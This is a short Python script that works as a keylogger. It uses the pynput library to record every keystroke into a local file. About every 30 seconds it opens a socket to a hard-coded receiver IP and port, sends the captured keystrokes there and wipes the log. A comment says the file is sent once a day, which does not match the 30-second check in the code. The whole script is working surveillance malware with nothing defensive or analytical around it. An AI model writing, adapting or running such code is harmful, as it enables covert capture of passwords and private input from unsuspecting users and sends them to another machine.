import time
import socket
from pynput import keyboard

# Define the IP address and port of the receiving computer
receiver_ip = '192.168.85.125'  # replace with the IP address of the receiving computer
receiver_port = 5000  # choose a port number

# Define the path to the log file
log_file_path = 'key_log.txt'

# Define a function to send the log file to the receiver
def send_file():
    # Create a socket object and connect to the receiver
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((receiver_ip, receiver_port))

    # Open the log file and read its contents
    with open(log_file_path, 'r') as f:
        file_contents = f.read()

    # Send the file contents to the receiver
    s.send(file_contents.encode('utf-8'))

    # Close the socket
    s.close()

    # Delete the log file
    with open(log_file_path, 'w'):
        pass

# Define a function to log the keystrokes
def on_press(key):
    with open(log_file_path, 'a') as f:
        try:
            # Get the string representation of the key
            key_str = key.char
        except AttributeError:
            # Special keys (e.g., shift, enter) don't have a character representation
            key_str = f'[{key}]'

        # Write the key to the log file
        f.write(key_str)

        # Check if it's been a day since the last file send, and send the file if necessary
        if time.time() - on_press.last_send_time > 30:
            send_file()
            on_press.last_send_time = time.time()

# Initialize the last send time
on_press.last_send_time = time.time()

# Start the keyboard listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
